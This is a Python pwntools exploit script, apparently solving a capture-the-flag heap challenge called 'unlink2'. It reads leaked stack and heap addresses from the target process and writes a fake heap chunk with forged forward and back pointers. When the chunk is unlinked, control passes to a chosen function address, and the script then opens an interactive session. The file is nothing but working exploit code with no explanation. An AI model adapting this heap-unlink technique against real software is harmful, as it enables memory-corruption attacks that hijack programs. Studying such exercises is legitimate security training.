from pwn import *

binary = 'unlink2'

brkpts = '''
b*0x080485f2
b*0x08048606

'''
io = process(binary)
#gdb.attach(io,brkpts)

target = 0x080484eb

io.recvuntil(': ')
stack_leak = int(io.recvuntil('\n').decode().split('\n')[0],16)+0x10
io.recvuntil(': ')
heap_leak = int(io.recvuntil('\n').decode().split('\n')[0],16)

log.info('target : {}'.format(hex(stack_leak)))
log.info('heap_leak : {}'.format(hex(heap_leak)))

write = 0x804a180

payload = b'A'*20
payload += p32(0x21)
payload += p32(heap_leak+0x28+4+100)      
payload += p32(stack_leak)	  
payload += b'B'*100             #extend into heap as system crashes
payload += p32(target)

io.sendline(payload)

io.interactive()